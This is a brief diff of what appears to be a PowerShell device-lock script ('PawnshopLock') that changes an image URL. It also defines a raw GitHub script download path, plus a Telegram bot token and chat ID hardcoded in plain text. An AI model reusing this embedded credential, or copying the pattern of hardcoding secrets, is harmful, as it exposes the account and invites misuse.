@@ -8,7 +8,7 @@
 $githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1"
 $localFolder = "$env:ProgramData\PawnshopLock"
 $localFile   = "$localFolder\pawnlock.ps1"
-$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/1.png"
+$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/69.jpeg"
 $tempImg     = "$env:TEMP\pawnlock.jpg"
 $botToken    = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
 $chatID      = "656189986"
